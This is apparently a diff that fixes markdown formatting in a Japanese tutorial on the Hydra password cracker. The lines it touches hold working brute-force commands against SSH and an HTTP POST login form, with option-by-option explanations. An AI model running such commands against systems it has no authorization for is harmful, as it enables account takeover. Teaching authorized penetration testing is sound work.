@@ -8,11 +8,11 @@ Hydraは、ログイン認証をクラックするためのパスワードクラ
 
 ```bash
 hydra [オプション] [ターゲットIP] [プロトコル]
+```
 2. SSHに対するブルートフォース攻撃の例
 特定のユーザー名とパスワードリストを使ってSSHサーバーに対してブルートフォース攻撃を行う例です。
-```
-```bash
 
+```bash
 hydra -l username -P /path/to/passwordlist.txt ssh://192.168.1.100
 ```
 - -l username: 攻撃対象のユーザー名を指定します。
@@ -25,10 +25,10 @@ hydra -l username -P /path/to/passwordlist.txt ssh://192.168.1.100
 
 hydra -l admin -P /path/to/passwordlist.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect"
 ```
-http-post-form:HTTP POSTリクエストでフォームを送信します。
-/login.php: ログインフォームのあるページのパスを指定します。
-username=^USER^&password=^PASS^: フォームの入力フィールド名を指定し、^USER^と^PASS^でそれぞれユーザー名とパスワードが置き換えられます。
-F=incorrect: ログイン失敗時に表示される文字列を指定します。
+- http-post-form:HTTP POSTリクエストでフォームを送信します。
+- /login.php: ログインフォームのあるページのパスを指定します。
+- username=^USER^&password=^PASS^: フォームの入力フィールド名を指定し、^USER^と^PASS^でそれぞれユーザー名とパスワードが置き換えられます。
+- F=incorrect: ログイン失敗時に表示される文字列を指定します。
 
 
 4. FTPへのブルートフォース攻撃の例
